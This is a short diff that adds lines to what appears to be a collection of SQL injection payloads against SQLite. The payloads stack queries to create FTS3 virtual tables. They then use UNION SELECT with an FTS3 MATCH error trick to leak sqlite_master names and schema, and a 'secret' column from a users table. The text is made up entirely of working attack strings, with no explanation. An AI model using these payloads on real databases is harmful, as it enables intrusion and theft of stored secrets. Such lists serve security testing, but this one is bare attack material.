@@ -1,3 +1,11 @@
+'; CREATE VIRTUAL TABLE t1 USING fts3(x); --
+
 ' and 1=0 union SELECT 1,2,3 FROM t1 WHERE t1 MATCH '"'||substr((select name from sqlite_master limit 1),0); --
 
 ' and 1=0 union SELECT 1,2,3 FROM t1 WHERE t1 MATCH '"'||substr((select sql from sqlite_master limit 1),0); --
+
+' and 1=0 union SELECT 1,2,3 FROM t1 WHERE t1 MATCH '"'||substr((select secret from users limit 1),0); --
+
+
+
+'; CREATE VIRTUAL TABLE qwe USING fts3(x); SELECT 1,2,3 FROM qwe WHERE qwe MATCH '"'||substr((select secret from users limit 1),0); --
